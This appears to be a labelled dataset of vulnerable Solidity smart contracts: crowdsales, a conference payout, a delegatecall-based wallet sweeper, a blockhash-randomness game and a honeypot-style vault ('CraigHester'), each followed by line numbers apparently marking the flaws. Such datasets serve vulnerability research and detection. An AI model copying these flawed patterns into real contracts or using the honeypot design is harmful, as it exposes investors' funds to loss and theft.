      refundOn = true;
      token.finishMinting();
    } else {
      if(isSoftcapOn) {
        multisigWallet.transfer(invested);
      }
      uint issuedTokenSupply = token.totalSupply();
      uint summaryTokensPercent = bountyTokensPercent + foundersTokensPercent;
      uint summaryFoundersTokens = issuedTokenSupply.mul(summaryTokensPercent).div(percentRate - summaryTokensPercent);
      uint totalSupply = summaryFoundersTokens + issuedTokenSupply;
      uint foundersTokens = totalSupply.mul(foundersTokensPercent).div(percentRate);
      uint bountyTokens = totalSupply.mul(bountyTokensPercent).div(percentRate);
      token.mint(this, foundersTokens);
      token.transfer(foundersTokensWallet, foundersTokens);
      token.mint(this, bountyTokens);
      token.transfer(bountyTokensWallet, bountyTokens);
      if(nextSale == address(0)) {
        token.finishMinting();
      } else {
        token.setSaleAgent(nextSale);
      }
    }
  }
  function() external payable {
    createTokens();
  }
  function retrieveTokens(address anotherToken) public onlyOwner {
    ERC20 alienToken = ERC20(anotherToken);
    alienToken.transfer(multisigWallet, token.balanceOf(this));
  }
}
contract Configurator is Ownable {
  MintableToken public token;
  CommonSale public presale;
  CommonSale public mainsale;
  function deploy() {
    address presaleMultisigWallet = 0x675cf930aefA144dA7e10ddBACC02f902A233eFC;
    address presaleBountyTokensWallet = 0x06B8fF8476425E45A3D2878e0a27BB79efd4Dde1;
    address presaleFoundersWallet = 0x27F1Ac3E29CBec9D225d98fF95B6933bD30E3F71;
    uint presaleSoftcap = 50000000000000000000;
    uint presaleHardcap = 2000000000000000000000;
    address mainsaleMultisigWallet = 0xFb72502E9c56497BAC3B1c21DE434b371891CC05;
    address mainsaleBountyTokensWallet = 0xd08112054C8e01E33fAEE176531dEB087809CbB2;
    address mainsaleFoundersWallet = 0xDeFAE9a126bA5aA2537AaC481D9335827159D33B;
    uint mainsaleHardcap = 25000000000000000000000000;
    token = new TlindToken();
    presale = new CommonSale();
    presale.setToken(token);
    presale.setSoftcap(presaleSoftcap);
    presale.setHardcap(presaleHardcap);
    presale.setMultisigWallet(presaleMultisigWallet);
    presale.setFoundersTokensWallet(presaleFoundersWallet);
    presale.setBountyTokensWallet(presaleBountyTokensWallet);
    presale.setStart(1506344400);
    presale.setFoundersTokensPercent(15);
    presale.setBountyTokensPercent(5);
    presale.setPrice(10000000000000000);
    presale.addMilestone(8,200);
    presale.addMilestone(8,100);
    token.setSaleAgent(presale);","[64, 65]"
"pragma solidity ^0.4.24;
contract ConferencePay {
    uint public endTime;
    address public owner;
    mapping (bytes32 => uint) public talkMapping;
    using SafeMath for uint256;
    struct Talk {
        uint amount;
        address addr;
        bytes32 title;
    }
    Talk[] public talks;
    modifier onlyBefore(uint _time) { require(now < _time); _; }
    modifier onlyAfter(uint _time) { require(now > _time); _; }
	//event Transfer(address indexed _from, address indexed _to, uint256 _value);
	constructor(uint end) public {
        endTime = end;
        owner = msg.sender;
	}
    function getTalkCount() public constant returns(uint) {
        return talks.length;
    }
    function add(address addr, bytes32 title) public returns(uint) {
        uint index = talks.length;
        talkMapping[title] = index;
        talks.push(Talk({
            amount: 0,
            addr: addr,
            title: title
        }));
        return index;
    }
	function pay(uint talk) public payable returns(bool sufficient) {
		talks[talk].amount += msg.value;
		return true;
	}
    function end() public {
        require(now > endTime);
        uint max = 0;
        address winnerAddress;
        uint balance = address(this).balance;
        owner.transfer(balance.mul(20).div(100));
        for (uint i = 0; i < talks.length; i++) {
            if (talks[i].amount > max) {
                max = talks[i].amount;
                winnerAddress = talks[i].addr;
            }
            talks[i].addr.transfer(talks[i].amount.mul(70).div(100));
        }
        winnerAddress.transfer(address(this).balance);
    }
}
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}",[48]
"pragma solidity >=0.4.21 <0.6.0;
contract Token {
    function balanceOf(address a) external returns (uint) {return 0;}
    function transfer(address a, uint val) external returns (bool) {return false;}
}
contract AbstractSweeperList {
    function sweeperOf(address _token) external returns (address);
}
contract UserWallet {
    AbstractSweeperList c;
    constructor (address _sweeperlist) public {
        c = AbstractSweeperList(_sweeperlist);
    }
    function sweep(address _token, uint _amount) public {
        c.sweeperOf(_token).delegatecall(msg.data);
    }
}
contract Controller is AbstractSweeperList {
    address public owner;
    address public authorizedCaller;
    //destination defaults to same as owner
    //but is separate to allow never exposing cold storage
    address public destination;
    bool public halted;
    event LogNewWallet(address receiver);
    event LogSweep(address from, address token, uint amount);
    modifier onlyOwner() {
        require(msg.sender == owner, ""Sender is not the owner"");
        _;
    }
    modifier onlyAuthorizedCaller() {
        require(msg.sender == authorizedCaller, ""unauthorized call"");
        _;
    }
    modifier onlyAdmins() {
        require(msg.sender == authorizedCaller || msg.sender == owner, ""unauthorized call"");
        _;
    }
    constructor () public
    {
        owner = msg.sender;
        destination = msg.sender;
        authorizedCaller = msg.sender;
    }
    function changeAuthorizedCaller(address _newCaller) public onlyOwner {
        authorizedCaller = _newCaller;
    }
    function changeDestination(address _dest) public onlyOwner {
        destination = _dest;
    }
    function changeOwner(address _owner) public onlyOwner {
        owner = _owner;
    }
    function makeWallet() public onlyAdmins returns (address wallet)  {
        wallet = address(new UserWallet(address(this)));
        emit LogNewWallet(wallet);
    }
    //assuming halt because caller is compromised
    //so let caller stop for speed, only owner can restart
    function halt() public onlyAdmins {
        halted = true;
    }
    function start() public onlyOwner {
        halted = false;
    }
    //***********
    //SweeperList
    //***********
    address public defaultSweeper = address(new DefaultSweeper(address(this)));
    mapping (address => address) sweepers;
    function addSweeper(address _token, address _sweeper) public onlyOwner {
        sweepers[_token] = _sweeper;
    }
    function sweeperOf(address _token) public returns (address) {
        address sweeper = sweepers[_token];
        if (sweeper == address(0)) sweeper = defaultSweeper;
        return sweeper;
    }
    function logSweep(address from, address token, uint amount) public {
        emit LogSweep(from, token, amount);
    }
}
contract AbstractSweeper {
    //abstract:
    function sweep(address token, uint amount) external returns (bool);
    Controller controller;
    constructor (address _controller) public {
        controller = Controller(_controller);
    }
    modifier canSweep() {
        require(msg.sender == controller.authorizedCaller() || msg.sender == controller.owner(), ""Unauthorized call"");
        require(controller.halted() == false, ""Controller is in halted state"");
        _;
    }
}
contract DefaultSweeper is AbstractSweeper {
    constructor (address controller) public AbstractSweeper(controller) {}
    function sweep(address _token, uint _amount) public canSweep
    returns (bool) {
        Token token = Token(_token);
        uint amount = _amount;
        if (amount > token.balanceOf(address(this))) {
            return false;
        }
        address destination = controller.destination();
	// Because sweep is called with delegatecall, this typically
	// comes from the UserWallet.
        bool success = token.transfer(destination, amount);
        if (success) {
            controller.logSweep(address(this), _token, _amount);
        }
        return success;
    }
}",[15]
"pragma solidity 0.4.19;
contract Countout {
    address public owner;
    uint128 public ownerBank;
    uint8 public round;
    uint8 public round_after;
    uint8 public currentCount;
    uint8 public totalCount;
    uint128 public initialPrice = 0.005 ether;
    uint128 public bonusPrice = 0.1 ether;
    uint128 public nextPrice;
    uint128 public sumPrice;
    uint256 public lastTransactionTime;
    address public lastCountAddress;
    uint8 private randomCount;
    address[] public sevenWinnerAddresses;
    mapping (address => uint128) public addressToBalance;
    event Count(address from, uint8 count);
    event Hit(address from, uint8 count);
    /*** CONSTRUCTOR ***/
    function Countout() public {
        owner = msg.sender;
        _renew();
        _keepLastTransaction();
        //Set randomcount as 10 as pre-sale
        randomCount = 10;
    }
    /*** Owner Action ***/
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        if (_newOwner != address(0)) {
            owner = _newOwner;
        }
    }
    function ownerWithdraw() public onlyOwner {
        require (block.timestamp > lastTransactionTime + 7 days);
        if (round_after < 77 && sevenWinnerAddresses.length > 0){
            uint128 sevensWinnerBack = (ownerBank + sumPrice) / uint8(sevenWinnerAddresses.length) - 0.0000007 ether;
            uint8 i;
            for (i = 0; i < sevenWinnerAddresses.length; i++){
                addressToBalance[sevenWinnerAddresses[i]]  = addressToBalance[sevenWinnerAddresses[i]] + sevensWinnerBack;
            }
        } else {
            owner.transfer(this.balance);
        }
        sumPrice = 0;
        ownerBank = 0;
    }
    function sevenWinnerWithdraw() public {
        require(addressToBalance[msg.sender] > 0);
        msg.sender.transfer(addressToBalance[msg.sender]);
        addressToBalance[msg.sender] = 0;
    }
    /*** Main Function ***/
    function _payFee(uint128 _price, address _referralAddress) internal returns (uint128 _processing){
        uint128 _cut = _price / 100;
        _processing = _price - _cut;
        if (_referralAddress != address(0)){
            _referralAddress.transfer(_cut);
        } else {
            ownerBank = ownerBank + _cut;
        }
        uint8 i;
        for (i = 0; i < sevenWinnerAddresses.length; i++){
            addressToBalance[sevenWinnerAddresses[i]]  = addressToBalance[sevenWinnerAddresses[i]] + _cut;
            _processing = _processing - _cut;
        }
        uint128 _remaining = (7 - uint8(sevenWinnerAddresses.length)) * _cut;
        ownerBank = ownerBank + _remaining;
        _processing = _processing - _remaining;
    }
    function _renew() internal{
        round++;
        if (sevenWinnerAddresses.length == 7){
            round_after++;
        }
        currentCount = 0;
        nextPrice = initialPrice;
        randomCount = uint8(block.blockhash(block.number-randomCount))%10 + 1;
        if(randomCount >= 7){
            randomCount = uint8(block.blockhash(block.number-randomCount-randomCount))%10 + 1;
        }
        if (sevenWinnerAddresses.length < 7 && randomCount == 7){
            randomCount++;
        }
    }
    function _keepLastTransaction() internal{
        lastTransactionTime = block.timestamp;
        lastCountAddress = msg.sender;
    }
    function countUp(address _referralAddress) public payable {
        require (block.timestamp < lastTransactionTime + 7 days);
        require (msg.value == nextPrice);
        uint128 _price = uint128(msg.value);
        uint128 _processing;
        totalCount++;
        currentCount++;
        _processing = _payFee(_price, _referralAddress);
        if (currentCount > 1) {
            lastCountAddress.transfer(_processing);
        } else {
            sumPrice = sumPrice + _processing;
        }
        if (currentCount == randomCount) {
            Hit(msg.sender, currentCount);
            _renew();
        } else {","[39, 54]"
"// Copyright (C) 2017  The Halo Platform by Scott Morrison
// https://www.haloplatform.tech/
// 
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit:
//
//      https://www.gnu.org/licenses/gpl-2.0.html
//
pragma solidity ^0.4.18;
contract Ownable {
    address Owner;
    function Ownable() { Owner = msg.sender; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
contract Token {
    function balanceOf(address who) constant public returns (uint256);
    function transfer(address to, uint amount) constant public returns (bool);
}
// tokens are withdrawable
contract TokenVault is Ownable {
    address owner;
    event TokenTransfer(address indexed to, address token, uint amount);
    function withdrawTokenTo(address token, address to) public onlyOwner returns (bool) {
        uint amount = balanceOfToken(token);
        if (amount > 0) {
            TokenTransfer(to, token, amount);
            return Token(token).transfer(to, amount);
        }
        return false;
    }
    function balanceOfToken(address token) public constant returns (uint256 bal) {
        bal = Token(token).balanceOf(address(this));
    }
}
// store ether & tokens for a period of time
contract CraigHester is TokenVault {
    string public constant version = ""v1.2"";
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 1 ether;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { if(Locked) revert(); Locked = true; }
    modifier open { if (!Locked) _; owner = msg.sender; deposit(); }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}","[58, 77]"
"    }
    // @return true if the public ICO is in progress
    function isPublicIcoActive() public constant returns (bool) {
        bool isPayable = Stages.Payable == getCurrentStage();
        bool isPublic = PayableStages.PublicIco == getPayableStage();
        return isPayable && isPublic;
    }
    // @return true if ICO has ended
    function hasEnded() public constant returns (bool) {
        return Stages.AfterIco == getCurrentStage();
    }
    // @return true if the soft cap has been reached
    function softCapReached() public constant returns (bool) {
        return amountRaised >= SOFT_CAP;
    }
    // withdraw the contributed funds if the ICO has
    // ended and the goal has not been reached
    function withdrawFunds() public atStage(Stages.AfterIco) returns(bool) {
        require(!softCapReached());
        require(balanceOf[msg.sender] > 0);
        uint256 balance = balanceOf[msg.sender];
        balanceOf[msg.sender] = 0;
        msg.sender.transfer(balance);
        return true;
    }
    // transfer the raised funds to the target wallet if
    // the ICO is over and the goal has been reached
    function finalizeIco() public onlyOwner atStage(Stages.AfterIco) {
        require(softCapReached());
        targetWallet.transfer(this.balance);
    }
    function withdrawUnsoldTokens() public onlyOwner atStage(Stages.AfterIco) {
        token.transfer(targetWallet, token.balanceOf(this));
    }
    function pause() public onlyOwner {
        require(!paused);
        paused = true;
    }
    function resume() public onlyOwner {
        require(paused);
        paused = false;
    }
    function changeTargetWallet(address wallet) public onlyOwner {
        targetWallet = wallet;
        targetWalletVerified = false;
    }
    function calculateTokensAmount(uint256 funds) internal returns (uint256) {
        uint256 tokens = funds.div(TOKEN_PRICE);
        if (tokensSold < BONUS_BATCH) {
            if (tokensSold.add(tokens) > BONUS_BATCH) {
                uint256 bonusBaseTokens = BONUS_BATCH.mul(100).div(125).sub(tokensSold);
                tokens = tokens.add(bonusBaseTokens.mul(BONUS_PERCENTAGE).div(100));
            } else {
                tokens = tokens.mul(BONUS_PERCENTAGE + 100).div(100);
            }
        }
        return tokens;
    }
    function getCurrentStage() internal constant returns (Stages) {
        if (!targetWalletVerified) {
            return Stages.WalletUnverified;
        } else if (now < preStartTime) {
            return Stages.BeforeIco;
        } else if (now < endTime && amountRaised < HARD_CAP) {
            return Stages.Payable;
        } else {
            return Stages.AfterIco;
        }
    }
    function getPayableStage() internal constant returns (PayableStages) {
        if (now < startTime) {
            return PayableStages.PreIco;
        } else {
            return PayableStages.PublicIco;
        }
    }
}",[64]
"  bool public mintingFinished = false;
  modifier canMint() {
    require(!mintingFinished);
    _;
  }
  /**
   * @dev Function to mint tokens
   * @param _to The address that will recieve the minted tokens.
   * @param _amount The amount of tokens to mint.
   * @return A boolean that indicates if the operation was successful.
   */
  function mint(address _to, uint256 _amount) onlyOwner canMint returns (bool) {
    totalSupply = totalSupply.add(_amount);
    balances[_to] = balances[_to].add(_amount);
    Mint(_to, _amount);
    return true;
  }
  /**
   * @dev Function to stop minting new tokens.
   * @return True if the operation was successful.
   */
  function finishMinting() onlyOwner returns (bool) {
    mintingFinished = true;
    MintFinished();
    return true;
  }
}
contract RWTSToken is MintableToken {
    string public constant name = ""RWTStart"";
    string public constant symbol = ""RWTS"";
    uint32 public constant decimals = 18;
}
contract Crowdsale is Ownable {
    using SafeMath for uint;
    address public multisig;
    uint public restrictedPercent;
    address public restricted;
    RWTSToken public token = new RWTSToken();
    uint public startdate;
    uint public enddate;
    uint public rate;
    uint public hardcap;
    uint public softcap;
    mapping(address => uint) public balances;
    function Crowdsale() {
      multisig = 0xFf9ce13Da1064bb0469f2046c9824BF521e4aB79;
      restricted = 0x24abb04877ed5586dA6fe3D8F76E61Fd5EdBb1eA;
      startdate = 1530489599;
      enddate = 1533945599;
      rate = 330000000000000;
      softcap = 360000000000000000000;
      hardcap = 3100000000000000000000;
      restrictedPercent = 5;
    }
    modifier saleIsOn() {
      require(now > startdate && now < enddate);
      _;
    }
    modifier isUnderHardCap() {
      require(this.balance < hardcap);
      _;
    }
    function refund() external {
      require(this.balance < softcap && now > enddate);
      uint value = balances[msg.sender];
      balances[msg.sender] = 0;
      msg.sender.transfer(value);
    }
    function finishMinting() public onlyOwner {
      if(this.balance >= softcap) {
        multisig.transfer(this.balance);
        uint issuedToken = token.totalSupply();
        uint restrictedTokens = issuedToken.mul(restrictedPercent).div(100);
        token.mint(restricted, restrictedTokens);
        token.finishMinting();
      }
    }
   function createTokens() isUnderHardCap saleIsOn payable {
      uint tokens = msg.value.div(rate).mul(1 ether);
      uint bonusTokens = 0;
     if(now < 1531439999) {
        bonusTokens = tokens.mul(35).div(100);
     }
      tokens += bonusTokens;
      token.mint(msg.sender, tokens);
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }
    function() external payable {
        require(msg.value >= 33000000000000000);
        createTokens();
    }
}",[64]
"        registered[_customer] = true;
        if (_referral != address(0) && _referral != _customer) {
            referral[_customer] = _referral;
        }
    }
    function checkCustomer(address _customer) public view returns (bool, address) {
        return ( registered[_customer], referral[_customer]);
    }
    function checkReleaseAt(address _owner) public constant returns (uint256 date) {
        return token.releaseAt(_owner);
    }
    function deleteCustomer(address _customer) public onlyOwner {
        require(_customer!= address(0));
        delete registered[_customer];
        delete referral[_customer];
        // return Wei && Drain tokens
        token.unMint(_customer);
        if ( weiBalances[_customer] > 0 ) {
            _customer.transfer(weiBalances[_customer]);
            weiBalances[_customer] = 0;
        }
    }
    function globalPause(bool _state) public onlyOwner {
        isGlobalPause = _state;
    }
    function changeRateSale(uint _tokenAmount) public onlyOwner {
        require(isGlobalPause || (now > startSale && now < finishSale));
        rateSale = _tokenAmount;
    }
    function changeRatePreSale(uint _tokenAmount) public onlyOwner {
        require(isGlobalPause || (now > startPreSale && now < finishPreSale));
        ratePreSale = _tokenAmount;
    }
    function changeStartPreSale(uint256 _ts) public onlyOwner {
        startPreSale = _ts;
    }
    function changeFinishPreSale(uint256 _ts) public onlyOwner {
        finishPreSale = _ts;
    }
    function changeStartSale(uint256 _ts) public onlyOwner {
        startSale = _ts;
    }
    function changeFinishSale(uint256 _ts) public onlyOwner {
        finishSale = _ts;
    }
    function finishMinting() public onlyOwner {
        require(totalWeiSale >= softcap);
        require(!isFinished);
        multisig.transfer(this.balance);
        uint issuedTokenSupply = token.totalSupply();
        // 40% restricted + 60% issuedTokenSupply = 100%
        uint restrictedTokens = issuedTokenSupply.mul(restrictedPercent).div(100 - restrictedPercent);
        issuedTokenSupply = issuedTokenSupply.add(restrictedTokens);
        // 13% - 11% for any purpose and 2% bounty
        token.mint(restricted, issuedTokenSupply.mul(13).div(100), now);
        // 27% - freezed founds to team & adwisers
        token.mint(release6m, issuedTokenSupply.mul(85).div(1000), now + 180 * 1 days); // 8.5 %
        token.mint(release12m, issuedTokenSupply.mul(85).div(1000), now + 365 * 1 days); // 8.5 %
        token.mint(release18m, issuedTokenSupply.mul(10).div(100), now + 545 * 1 days); // 10 %
        tokenTotal=token.totalSupply();
        token.finishMinting();
        isFinished=true;
    }
    function foreignBuyTest(uint256 _weiAmount, uint256 _rate) public pure returns (uint tokenAmount) {
        require(_weiAmount > 0);
        require(_rate > 0);
        return _rate.mul(_weiAmount).div(1 ether);
    }
    function foreignBuy(address _holder, uint256 _weiAmount, uint256 _rate) public isUnderHardCap preSaleIsOn onlyOwner {
        require(_weiAmount > 0);
        require(_rate > 0);
        registered[_holder] = true;
        uint tokens = _rate.mul(_weiAmount).div(1 ether);
        token.mint(_holder, tokens, 0);
        tokenTotal = token.totalSupply();
        totalWeiSale = totalWeiSale.add(_weiAmount);
    }
    // Refund Either && Drain tokens
    function refund() public {
        require(totalWeiSale <= softcap && now >= finishSale);
        require(weiBalances[msg.sender] > 0);
        token.unMint(msg.sender);
        msg.sender.transfer(weiBalances[msg.sender]);
        totalWeiSale = totalWeiSale.sub(weiBalances[msg.sender]);
        tokenTotal = token.totalSupply();
        weiBalances[msg.sender] = 0;
    }
    function buyTokensPreSale() public isRegistered isUnderHardCap preSaleIsOn payable {
        uint tokens = ratePreSale.mul(msg.value).div(1 ether);
        require(tokens >= 10000); // min 10 tokens
        multisig.transfer(msg.value);
        uint bonusValueTokens = 0;
        uint saleEther = (msg.value).mul(10).div(1 ether);
        if (saleEther >= 125 && saleEther < 375 ) { // 12,5 ETH
            bonusValueTokens = tokens.mul(15).div(100);
        } else if (saleEther >= 375 && saleEther < 750 ) { // 37,5 ETH
            bonusValueTokens = tokens.mul(20).div(100);
        } else if (saleEther >= 750 && saleEther < 1250 ) { // 75 ETH
            bonusValueTokens=tokens.mul(25).div(100);
        } else if (saleEther >= 1250  ) { // 125 ETH
            bonusValueTokens = tokens.mul(30).div(100);
        }
        tokens = tokens.add(bonusValueTokens);
        totalWeiSale = totalWeiSale.add(msg.value);
        token.mint(msg.sender, tokens, 0);
        if ( referral[msg.sender] != address(0) ) {
            uint refererTokens = tokens.mul(refererPercent).div(1000);
            token.mint(referral[msg.sender], refererTokens, 0);
        }
        tokenTotal=token.totalSupply();
    }
    function createTokens() public isRegistered isUnderHardCap saleIsOn payable {
        uint tokens = rateSale.mul(msg.value).div(1 ether);
        require(tokens >= 10000); // min 10 tokens
        uint bonusTokens = 0;
        if ( now < startSale + (bonusPeriod * 1 days) ) {
            uint percent = bonusPeriod - (now - startSale).div(1 days);
            if ( percent > 0 ) {
                bonusTokens = tokens.mul(percent).div(100);
            }
        }
        tokens=tokens.add(bonusTokens);
        totalWeiSale = totalWeiSale.add(msg.value);
        token.mint(msg.sender, tokens, 0);
        if ( referral[msg.sender] != address(0) ) {
            uint refererTokens = tokens.mul(refererPercent).div(1000);
            token.mint(referral[msg.sender], refererTokens, 0);
        }","[49, 80]"
"  }
  // called by the owner on end of emergency, returns to normal state
  function unhalt() external onlyOwner onlyInEmergency {
    halted = false;
  }
}
contract Crowdsale is CrowdsaleLimit, Haltable {
  using SafeMath for uint256;
  CrowdsaleToken public token;
  /* tokens will be transfered from this address */
  address public multisigWallet;
  /** How much ETH each address has invested to this crowdsale */
  mapping (address => uint256) public investedAmountOf;
  /** How much tokens this crowdsale has credited for each investor address */
  mapping (address => uint256) public tokenAmountOf;
  /** Addresses that are allowed to invest even before ICO offical opens. For testing, for ICO partners, etc. */
  mapping (address => bool) public presaleWhitelist;
  bool public whitelist_enable= true;
  /* the number of tokens already sold through this contract*/
  uint public tokensSold = 0;
  /* How many distinct addresses have invested */
  uint public investorCount = 0;
  /* How much wei we have returned back to the contract after a failed crowdfund. */
  uint public loadedRefund = 0;
  /* Has this crowdsale been finalized */
  bool public finalized;
  enum State{Unknown, PreFunding, Funding, Success, Failure, Finalized, Refunding}
  // A new investment was made
  event Invested(address investor, uint weiAmount, uint tokenAmount);
  // Address early participation whitelist status changed
  event Whitelisted(address addr, bool status);
  event createTeamTokenEvent(address addr, uint tokens);
  event Finalized();
  /** Modified allowing execution only if the crowdsale is currently running.  */
  modifier inState(State state) {
    if(getState() != state) revert();
    _;
  }
  function Crowdsale(address _token, address _multisigWallet, uint _start, uint _end, uint _token_max, uint _presale_token_in_wei, uint _crowdsale_token_in_wei, uint _presale_eth_inwei_fund_max, uint _crowdsale_eth_inwei_fund_min, uint _crowdsale_eth_inwei_fund_max, uint _crowdsale_eth_inwei_accepted_min, uint _crowdsale_gasprice_inwei_max, uint _team_token_percentage_max, bool _whitelist_enable)
           CrowdsaleLimit(_start, _end, _token_max, _presale_token_in_wei, _crowdsale_token_in_wei, _presale_eth_inwei_fund_max, _crowdsale_eth_inwei_fund_min, _crowdsale_eth_inwei_fund_max, _crowdsale_eth_inwei_accepted_min, _crowdsale_gasprice_inwei_max, _team_token_percentage_max)
  {
    require(_token != 0x0);
    require(_multisigWallet != 0x0);
	token = CrowdsaleToken(_token);
	multisigWallet = _multisigWallet;
	whitelist_enable= _whitelist_enable;
  }
  /* Crowdfund state machine management. */
  function getState() public constant returns (State) {
    if(finalized) return State.Finalized;
    else if (now < startsAt) return State.PreFunding;
    else if (now <= endsAt && !isMinimumGoalReached()) return State.Funding;
    else if (isMinimumGoalReached()) return State.Success;
    else if (!isMinimumGoalReached() && crowdsale_eth_fund > 0 && loadedRefund >= crowdsale_eth_fund) return State.Refunding;
    else return State.Failure;
  }
  /**
   * Allow addresses to do early participation.
   *
   * TODO: Fix spelling error in the name
   */
  function setPresaleWhitelist(address addr, bool status) onlyOwner inState(State.PreFunding) {
	require(whitelist_enable==true);
    presaleWhitelist[addr] = status;
    Whitelisted(addr, status);
  }
  //add new team percentage of tokens and lock their release time
  function addTeamAddress(address addr, uint release_time, uint token_percentage) onlyOwner inState(State.PreFunding) external {
	super.addTeamAddressInternal(addr, release_time, token_percentage);
	token.addLockAddress(addr, release_time);  //not use delegatecall
  }
  //generate team tokens in accordance with percentage of total issue tokens, not preallocate
  function createTeamTokenByPercentage() onlyOwner internal {
	//uint total= token.totalSupply();
	uint total= tokensSold;
	//uint tokens= total.mul(100).div(100-team_token_percentage_total).sub(total);
	uint tokens= total.mul(team_token_percentage_total).div(100-team_token_percentage_total);
	for(uint i=0; i<team_address_count; i++) {
		address addr= team_addresses_idx[i];
		if(addr==0x0) continue;
		uint ntoken= tokens.mul(team_addresses_token_percentage[addr]).div(team_token_percentage_total);
		token.mint(addr, ntoken);
		createTeamTokenEvent(addr, ntoken);
	}
  }
  // fallback function can be used to buy tokens
  function () stopInEmergency allowCrowdsaleAmountLimit payable {
	require(msg.sender != 0x0);
    buyTokensCrowdsale(msg.sender);
  }
  // low level token purchase function
  function buyTokensCrowdsale(address receiver) internal /*stopInEmergency allowCrowdsaleAmountLimit payable*/ {
	uint256 weiAmount = msg.value;
	uint256 tokenAmount= 0;
	if(getState() == State.PreFunding) {
		if(whitelist_enable==true) {
			if(!presaleWhitelist[receiver]) {
				revert();
			}
		}
		if((PRESALE_ETH_IN_WEI_FUND_MAX > 0) && ((presale_eth_fund.add(weiAmount)) > PRESALE_ETH_IN_WEI_FUND_MAX)) revert();
		tokenAmount = calculateTokenPresale(weiAmount, token.decimals());
		presale_eth_fund = presale_eth_fund.add(weiAmount);
	}
	else if((getState() == State.Funding) || (getState() == State.Success)) {
		tokenAmount = calculateTokenCrowsale(weiAmount, token.decimals());
    } else {
      // Unwanted state
      revert();
    }
	if(tokenAmount == 0) {
		revert();
	}
	if(investedAmountOf[receiver] == 0) {
       investorCount++;
    }
	// Update investor
    investedAmountOf[receiver] = investedAmountOf[receiver].add(weiAmount);
    tokenAmountOf[receiver] = tokenAmountOf[receiver].add(tokenAmount);
    // Update totals
	crowdsale_eth_fund = crowdsale_eth_fund.add(weiAmount);
	tokensSold = tokensSold.add(tokenAmount);
	if((TOKEN_MAX > 0) && (tokensSold > TOKEN_MAX)) revert();
    token.mint(receiver, tokenAmount);
    if(!multisigWallet.send(weiAmount)) revert();
	// Tell us invest was success
    Invested(receiver, weiAmount, tokenAmount);
  }","[52, 77]"
"  /**
   * @dev Source of tokens. Override this method to modify the way in which the crowdsale ultimately gets and sends its tokens.
   * @param _beneficiary Address performing the token purchase
   * @param _tokenAmount Number of tokens to be emitted
   */
  function _deliverTokens(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    require(token.transfer(_beneficiary, _tokenAmount));
  }
  /**
   * @dev Executed when a purchase has been validated and is ready to be executed. Not necessarily emits/sends tokens.
   * @param _beneficiary Address receiving the tokens
   * @param _tokenAmount Number of tokens to be purchased
   */
  function _processPurchase(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    _deliverTokens(_beneficiary, _tokenAmount);
  }
  /**
   * @dev Override to extend the way in which ether is converted to tokens.
   * @param _weiAmount Value in wei to be converted into tokens
   * @return Number of tokens that can be purchased with the specified _weiAmount
   */
  function _getTokenAmount(uint256 _weiAmount, uint8 _stageIndex)
    internal view returns (uint256)
  {
    uint256 _bonus = 0;
    uint256 _cap;
    if (_stageIndex == 1) {
      _bonus = round1Bonus;
      _cap = round1Cap.sub(round1Sold);
    } else if (_stageIndex == 2) {
      _cap = round2Cap.sub(round1Sold);
    } else if (_stageIndex == 3) {
      _bonus = round2Bonus;
      _cap = round1Cap.sub(round1Sold).add(round2Cap).sub(round2Sold);
    } else if (_stageIndex == 4) {
      _cap = round1Cap.sub(round1Sold).add(round2Cap).sub(round2Sold);
    } else if (_stageIndex == 5) {
      _bonus = round3Bonus;
      _cap = round1Cap.sub(round1Sold).add(round2Cap).sub(round2Sold).add(round3Cap).sub(round3Sold);
    }  else if (_stageIndex == 6) {
      _cap = round1Cap.sub(round1Sold).add(round2Cap).sub(round2Sold).add(round3Cap).sub(round3Sold);
    } else {
      _cap = round1Cap.sub(round1Sold).add(round2Cap).sub(round2Sold).add(round3Cap).sub(round3Sold).add(round4Cap).sub(round4Sold);
    }
    uint256 _tokenAmount = _weiAmount.mul(rate);
    if (_bonus > 0) {
      uint256 _bonusTokens = _tokenAmount.mul(_bonus).div(100);
      _tokenAmount = _tokenAmount.add(_bonusTokens);
    }
    if (_stageIndex < 8) require(_tokenAmount <= _cap);
    return _tokenAmount;
  }
  function refund () public returns (bool) {
    require(now > round4EndTime);
    require(weiRaised < softCap);
    require(contributions[msg.sender] > 0);
    uint256 refundAmount = contributions[msg.sender];
    contributions[msg.sender] = 0;
    weiRaised = weiRaised.sub(refundAmount);
    msg.sender.transfer(refundAmount);
    return true;
  }
  /**
   * @dev Determines how ETH is stored/forwarded on purchases.
   */
  function _forwardFunds() internal {
